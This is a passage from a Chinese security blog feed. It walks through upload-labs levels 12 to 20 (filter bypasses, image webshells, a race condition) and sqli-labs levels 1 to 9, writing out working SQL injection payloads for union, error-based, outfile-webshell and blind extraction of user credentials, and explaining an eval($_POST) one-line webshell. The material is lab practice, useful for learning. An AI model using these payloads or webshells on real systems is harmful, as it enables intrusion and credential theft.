punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'save_path'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>post不会自行解码，我们需要对%00进行编码,对%00选中右击：<br><img src="/images/upload-labs%E9%80%9A%E5%85%B3%E8%A7%A3%E6%9E%90/8.png"><br><img src="/images/upload-labs%E9%80%9A%E5%85%B3%E8%A7%A3%E6%9E%90/9.png"><br>发送即可</p><h2 id="upload-labs-Pass-13"><a href="#upload-labs-Pass-13" class="headerlink" title="upload-labs Pass-13"></a>upload-labs Pass-13</h2><hr><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">getReailFileType</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$bin</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//只读2字节</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$strInfo</span> <span class="token operator">=</span> @<span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"C2chars"</span><span class="token punctuation">,</span> <span class="token variable">$bin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$typeCode</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$strInfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chars1'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$strInfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chars2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$typeCode</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>              <span class="token keyword">case</span> <span class="token number">255216</span><span class="token punctuation">:</span>                        <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">13780</span><span class="token punctuation">:</span>                        <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'png'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token number">7173</span><span class="token punctuation">:</span>                        <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'gif'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>                        <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'unknown'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token variable">$fileType</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第十三关，用图片+php代码，组成一个图片码进行上传，当然要想解析出来这个图片，还得有这个包含漏洞。<strong>这里一定要用一个真正的图片，只有用相同类型的图片造相同类型的图片</strong><br>这里附上图片码制作<a href="https://blog.csdn.net/Key_book/article/details/80610349">链接</a><br>文件对自身文件内容,有着自己的文件头标识,需要文件转为16进制,然后看各个文件类型对文件头的定义,就可以知道文件的类型了</p><pre class="line-numbers language-none"><code class="language-none">1.BMP-文件头标识 (2 bytes) 42 4D2.PNG- 文件头标识 (8 bytes) 89 50 4E 47 0D 0A 1A 0A3.GIF- 文件头标识 (6 bytes) 47 49 46 38 39(37) 614.JPEG&#x2F;JPG- 文件头标识 (2 bytes): FF, D8 (SOI) (JPEG 文件标识)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里用fopen函数打开图片文件用rb（二进制打开），他只读两个字节 unpack从二进制字符串对数据进行解包，加@的原因就是让其怎么都可以执行不报错 ，而这里的unpack的意思是 将$bin中的以二进制的形式解包输出到chars中。 而下面这个intval是转化十进制的意思，将本来输出的二进制再转化为十进制，接下来就是进选择判断了。<br>把制作好图片码上传上去，点击黄色的“文件包含漏洞”，并构造如图的url即可<br><img src="/images/upload-labs%E9%80%9A%E5%85%B3%E8%A7%A3%E6%9E%90/10.png"><br>正常可以看到一堆乱码：<br><img src="/images/upload-labs%E9%80%9A%E5%85%B3%E8%A7%A3%E6%9E%90/11.png"><br>也可以用这个URL链接蚁剑</p><h2 id="upload-labs-Pass-14"><a href="#upload-labs-Pass-14" class="headerlink" title="upload-labs Pass-14"></a>upload-labs Pass-14</h2><hr><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">isImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$types</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'.jpeg|.png|.gif'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">image_type_to_extension</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$types</span><span class="token punctuation">,</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>getimagesize() 函数：将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。没什么变化用和上题的方法就行。</li></ul><h2 id="upload-labs-Pass-15"><a href="#upload-labs-Pass-15" class="headerlink" title="upload-labs Pass-15"></a>upload-labs Pass-15</h2><hr><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$image_type</span> <span class="token operator">=</span> <span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>exif_imagetype() 读取一个图像的第一个字节并检查其签名。<br>本函数可用来避免调用其它 exif 函数用到了不支持的文件类型上或和 $_SERVER[‘HTTP_ACCEPT’] 结合使用来检查浏览器是否可以显示某个指定的图像。更改phpstudy的配置文件php.ini<a href="https://blog.csdn.net/aocong5568/article/details/102263104">更改方法</a><br>之后和13关一样</p><h2 id="upload-labs-Pass-16-二次渲染"><a href="#upload-labs-Pass-16-二次渲染" class="headerlink" title="upload-labs Pass-16 二次渲染"></a>upload-labs Pass-16 二次渲染</h2><hr><h3 id="二次渲染原理"><a href="#二次渲染原理" class="headerlink" title="二次渲染原理"></a>二次渲染原理</h3><ul><li>imagecreatefromjpeg（）函数，二次渲染是由Gif文件或 URL 创建一个新图象。成功则返回一图像标识符&#x2F;图像资源，失败则返回false，导致图片马的数据丢失，上传图片马失败。</li></ul><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>把原图和他修改过的图片进行比较，看看哪个部分没有被修改。将php代码放到没有被更改的部分，配合包含漏洞，就可以了。<br><img src="/images/upload-labs%E9%80%9A%E5%85%B3%E8%A7%A3%E6%9E%90/12.png"><br>如图两段是没有改变过的一段区域，（左边的图被我改成了一句话木马），在原图该区域写上一句话木马即可。<br>具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的（我就失败了很多次），知道怎么解就可以了</p><h2 id="upload-labs-Pass-17-条件竞争"><a href="#upload-labs-Pass-17-条件竞争" class="headerlink" title="upload-labs Pass-17 条件竞争"></a>upload-labs Pass-17 条件竞争</h2><hr><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$upload_file</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>             <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样这里先判断白名单，然后获取文件名和并截取后缀名，<code>$upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name;</code>这一句是上传目录的名称和已经截取到的后缀名，接着上传这个文件，这里就有问题了他是先上传文件后判断这个文件名合不合法，如果不合法将其删掉，可是这段代码的执行还是有时间的，虽然很短但是只要我们上传的足够多次且够快，在它删掉之前就可以访到它问，这就相当于我们打开了一个文件，然后再去删除这个文件，就会提示这个文件在另一程序中打开无法删除。<br>下面演示操作：<br>上传一个一句话木马的php文件后，bp抓包<br><img src="/images/upload-labs%E9%80%9A%E5%85%B3%E8%A7%A3%E6%9E%90/13.png"><br><img src="/images/upload-labs%E9%80%9A%E5%85%B3%E8%A7%A3%E6%9E%90/14.png"><br><img src="/images/upload-labs%E9%80%9A%E5%85%B3%E8%A7%A3%E6%9E%90/15.png"><br><img src="/images/upload-labs%E9%80%9A%E5%85%B3%E8%A7%A3%E6%9E%90/16.png"><br>出现200算成功了，这时将upload文件夹打开可以看到我们上传的文件一直闪烁，出现又消失。</p><h2 id="upload-labs-Pass-18"><a href="#upload-labs-Pass-18" class="headerlink" title="upload-labs Pass-18"></a>upload-labs Pass-18</h2><hr><p>这关和上关差不多但是有点不一样的是它先检查后上传，也就是我们的上传得符合白名单，于是我们可以用图片木马来做，可以用之前的关卡验证是否木马有效。</p><h2 id="upload-labs-Pass-19"><a href="#upload-labs-Pass-19" class="headerlink" title="upload-labs Pass-19"></a>upload-labs Pass-19</h2><hr><p>这关对上传的文件没有检查，但是会对我们保存的文件名进行黑名单检查，而move_uploaded_file()有这么一个特性，会忽略掉文件末尾的 &#x2F;.（前面一直没说，他会用第一个参数的名字，修改第二个参数，也就是保存路径的最终文件名字，而这个改变会将&#x2F;.忽略），我们在save_name中把后缀名加上&#x2F;.就可以绕过<br><img src="/images/upload-labs%E9%80%9A%E5%85%B3%E8%A7%A3%E6%9E%90/17.png"></p><h2 id="upload-labs-Pass-20"><a href="#upload-labs-Pass-20" class="headerlink" title="upload-labs Pass-20"></a>upload-labs Pass-20</h2><hr><p>做这关前先看看这几个函数：</p><ul><li>explode(separator,string[,limit]) 函数，使用一个字符串分割另一个字符串，并返回由字符串组成的数组。</li><li>end(array)函数，输出数组中的当前元素和最后一个元素的值。</li><li>reset(array)函数，把数组的内部指针指向第一个元素，并返回这个元素的值</li><li>count(array)函数，计算数组中的单元数目，或对象中的属性个数<br>这关是先判断mime类型合不合法，如果判断文件名不是数组，再将文件名字进行拆分也就是explode函数，接着判断黑名单文件名<br><code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>重点是这句话，它将前面切分的文件进行组合，也就是数组的第一个元素和倒数第二个元素组合而成新的file_name,接着正常上传<br><img src="/images/upload-labs%E9%80%9A%E5%85%B3%E8%A7%A3%E6%9E%90/18.png"><br>上面遗漏了对mime类型的更改，我们上传save_name[0]、save_name[2]是先绕过判断，也就是不用explode拆分了，然后相当于告诉它这个数组有3个元素，且save[1]为空没设置值，直接用save[0]将我们要的文件名上传就行了</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> web靶场攻略 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli_labs部分解题关卡</title>
      <link href="/2023/03/25/sqli-labs-1-4/"/>
      <url>/2023/03/25/sqli-labs-1-4/</url>
      
        <content type="html"><![CDATA[<h1 id="web靶场-sqli-labs-1-4"><a href="#web靶场-sqli-labs-1-4" class="headerlink" title="web靶场 sqli_labs 1~4"></a>web靶场 sqli_labs 1~4</h1><hr><h4 id="转方向感言："><a href="#转方向感言：" class="headerlink" title="转方向感言："></a>转方向感言：</h4><ul><li>很遗憾学了pwn那么久，因为福州没有pwn的就业，本人不想出省，老实说很扎心，改方向这个决定做的很艰难，但决定了要改就会一定要改下去，而且要做的更好，希望后面的学弟继续坚持。这篇博客作为一座里程碑，记录我web的成长和pwn的逝去。</li></ul><hr><p>sqli注入的基本知识具体看b站的这个视频<a href="https://www.bilibili.com/video/BV1HT411E7bH?p=7&vd_source=6b56c0a6f7c42ccbc63f5ce49fb71500">2022b站最详细的sql注入 从入门到进阶</a></p><hr><h2 id="sqli-labs-less-1-4"><a href="#sqli-labs-less-1-4" class="headerlink" title="sqli-labs less 1~4"></a>sqli-labs less 1~4</h2><p>这篇博客以sqli-labs less4为例：<br><img src="/images/sqli-labs-1-4/1.png"><br>输入?id&#x3D;1：<br><img src="/images/sqli-labs-1-4/2.png"><br>由于是新手，我们看看源码（这里将1~4的源码都放上去比对一下）：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token comment">#less1</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id=<span class="token interpolation"><span class="token variable">$id</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token comment">#less2</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id=('<span class="token interpolation"><span class="token variable">$id</span></span>') LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token comment">#less3</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'"'</span> <span class="token operator">.</span> <span class="token variable">$id</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span><span class="token comment">#less4，下面也是less4</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id=(<span class="token interpolation"><span class="token variable">$id</span></span>) LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到’$id’、$id、(‘$id’)、(“$id”)四个区别<br>很明显less4要输入<strong>”）</strong>来截断：<br><img src="/images/sqli-labs-1-4/3.png"><br>如图页面有反应，这是没有查询结果的界面<br>接着测试有几个字段：<br><img src="/images/sqli-labs-1-4/4.png"><br><strong>union的作用是将前面的语句和后面的语句化为同一句代码</strong><br>要使union前面的代码没有输出结果，要将id改为-1，目的是输出后面我们的目的代码，如上图：输出2,3<br>将2改为database(),泄露库名为security：<br><img src="/images/sqli-labs-1-4/5.png"><br>用库名泄露表名：将3改为<br><code>table_name from information_schema.tables where table_schema=‘security’ limit 3,1--+</code><br><img src="/images/sqli-labs-1-4/6.png"><br>limit n，m是取n+1行开始的m个数据<br>也可以这么写,则可以输出全部的表名：<br><code>group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27%20--+</code><br><img src="/images/sqli-labs-1-4/7.png"><br>最后查看user的列名：<br><code>1,database(),group_concat(username),from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; --+</code><br><img src="/images/sqli-labs-1-4/8.png"><br>最后读取用户名和密码：<br><code>1,group_concat(username),group_concat(password) from security.users --+</code><br>结束</p><h1 id="sqli-labs-5-7"><a href="#sqli-labs-5-7" class="headerlink" title="sqli-labs 5~7"></a>sqli-labs 5~7</h1><hr><h2 id="报错注入演示："><a href="#报错注入演示：" class="headerlink" title="报错注入演示："></a>报错注入演示：</h2><hr><p>第5-6题以第6题为例：<br>这里用到一个新函数：updatexml函数<br>首先查库名：<br><code>?id=1&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</code><br><img src="/images/sqli-labs-5-7/1.png"><br>再查表名：<br><code>?id=1&quot; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = &#39;security&#39; limit 0,1),0x7e),1) --+</code><br><img src="/images/sqli-labs-5-7/2.png"><br>查列名：<br><code>?id=1&quot; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name =&#39;users&#39;and table_schema=database()),0x7e),1) --+</code><br><img src="/images/sqli-labs-5-7/5.png"><br>爆用户名：<br><code>?id=1&quot; and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1) --+</code><br><img src="/images/sqli-labs-5-7/3.png"><br>爆密码：<br><code>?id=1&quot; and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) --+</code><br><img src="/images/sqli-labs-5-7/4.png"></p><h2 id="一句话木马与outfile的应用"><a href="#一句话木马与outfile的应用" class="headerlink" title="一句话木马与outfile的应用"></a>一句话木马与outfile的应用</h2><hr><h3 id="0x01-outfile"><a href="#0x01-outfile" class="headerlink" title="0x01 outfile"></a>0x01 outfile</h3><h5 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h5><ul><li>1、Mysql数据库中secure_file_priv参数的设置要允许对目录进行导入导出操作，在mysql里添上这句代码secure_file_priv&#x3D;<br><img src="/images/sqli-labs-5-7/6.png"></li><li>2、Mysql对路径有读取的权限。<br><code>?id=1&#39;))%20and%20(select%20count(*)%20from%20mysql.user)&gt;0--+</code><br>回显正常则有权限<br>查库名：<br><code>?id=-1&#39;)) union select 1,2,database() into outfile&quot;D://phpstudy_pro//WWW//sqli-labs//Less-7//shell.php&quot;--+</code><br><img src="/images/sqli-labs-5-7/7.png"><br>像这样会回显在你的文件里，其他语句同理代换这里就不写了</li></ul><h3 id="0x02-一句话木马与蚁剑的应用"><a href="#0x02-一句话木马与蚁剑的应用" class="headerlink" title="0x02 一句话木马与蚁剑的应用"></a>0x02 一句话木马与蚁剑的应用</h3><h5 id="前提-1"><a href="#前提-1" class="headerlink" title="前提"></a>前提</h5><ul><li>1、木马成功上传，未被拦截</li><li>2、攻击者知道木马的路径</li><li>3、攻击者上传的木马文件可以被web服务器执行</li></ul><h5 id="一句话木马解析："><a href="#一句话木马解析：" class="headerlink" title="一句话木马解析："></a>一句话木马解析：</h5><p>例子：<br><img src="/images/sqli-labs-5-7/10.png"><br>1、php语句要写入到 中，这样网页才会识别这是一个php语句，然后网页再进一步解析该语句。<br>2、@的意思是即使执行错误，也不报错，继续执行。<br>3、$_POST是php语句中的超全局变量，意思就是a这个变量，用post的方法接收。（传输数据的两种方法：GET、POST。POST是在消息体存放数据，GET是在消息头的URL路径里存放数据）<br>4、eval() 函数把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。<br>5、综上所述，这句代码的意思就是用post方法接收变量a，把变量a里面的字符串当做php代码来执行。所以我们想要执行什么语句我们直接将其放入到变量a，用POST传输给一句话木马就可以。<br><img src="/images/sqli-labs-5-7/9.png"><br><img src="/images/sqli-labs-5-7/8.png"><br>用蚁剑操作可以看见我们的文件夹，如果是远程服务器，意味着我们攻陷了服务器<br><img src="/images/sqli-labs-5-7/11.png"></p><h1 id="sqli-labs-less-8-9"><a href="#sqli-labs-less-8-9" class="headerlink" title="sqli-labs less-8~9"></a>sqli-labs less-8~9</h1><hr><h2 id="布尔盲注："><a href="#布尔盲注：" class="headerlink" title="布尔盲注："></a>布尔盲注：</h2><hr><p>概念：布尔盲注一般适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 true 、 false使web页面返回true或者false，从而达到注入的目的来获取信息。<br>布尔盲注我们要用到几个函数：</p><ul><li>substr(str，字符串开始位置，字符串截取个数)</li><li>left(str，从左往右的截取个数)</li><li>right(str，从右往左的截取个数)</li><li>ascii()将str转换为ascll码</li><li>length()返回str长度<br>这里只提到一下这个方法，具体应用等到会写脚本时会具体讲解<br>下面是less-8的一些解题代码：<br>查看库名长度：<br><code>?id=1&#39; and length(database())&gt;0</code><br>爆破库名：<br><code>?id=1&#39; and left(database(),1)&gt;&#39;m&#39; –+</code><br>一个一个尝试得到security<br>爆破表名：<br><code>?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))&gt;97 –+</code><br>爆破列名：<br><code>?id=1&#39; and left((select column_name from information_schema.columns where table_name=&#39;emails&#39; limit 0,1),1)&gt;&#39;m&#39; –+</code><br>拆解字段：<br><code>?id=1&#39;and ascii((select id from emails limit 0,1))&gt;0 –+</code></li></ul><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>概念：时间盲注：适用于页面不会随着输入语句的不同而发生变化，只会回显一种界面。利用sleep()或benchmark()等函数让mysql执行时间变长经常与if(expr1,expr2,expr3)语句结合使用，通过页面的响应时间来判断条件是否正确。if(expr1,expr2,expr3)含义是如果expr1是True,则返回expr2,否则返回expr3。<br>函数：</p><ul><li>sleep(int)过int后响应</li><li>if(expr1,expr2,expr3)expr1是true，则返回expr2，或者返回expr3<br>为了更准确的看秒数我们可以开bp也可以如下操作：<br>1、右击黑色处选择检查<br>2、选择网络即可查看秒数<br><img src="/images/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E4%B8%8E%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/1.png"><br>要用时间盲注的题目一般关闭了报错和回显，没有任何有用的信息，这时只能通过时间来判断<br>以下给出部分做题代码：<br>判断闭合类型：<br><code>?id=1 and sleep(2)--+</code><br>发现加载时间没有2秒<br><code>?id=1&#39; and sleep(2)--+</code><br>发现有延迟2秒，判断为’闭合<br>接下来爆破库名：<br><code>?id=1 and if(left(database(),1)=&#39;s&#39;,sleep(2),1)--+</code><br>接下来将left(database(),1)&#x3D;’s’给换成其他语句就行了，就不一一例举了</li></ul><h1 id="sqli-labs-less-18-22"><a href="#sqli-labs-less-18-22" class="headerlink" title="sqli-labs less-18~22"></a>sqli-labs less-18~22</h1><hr><h2 id="HTTP头注入原理"><a href="#HTTP头注入原理" class="headerlink" title="HTTP头注入原理"></a>HTTP头注入原理</h2><hr><p>HTTP（HyperTextTransferProtocol）是超文本传输协议的缩写，它用于传送WWW方式的数据，关于HTTP 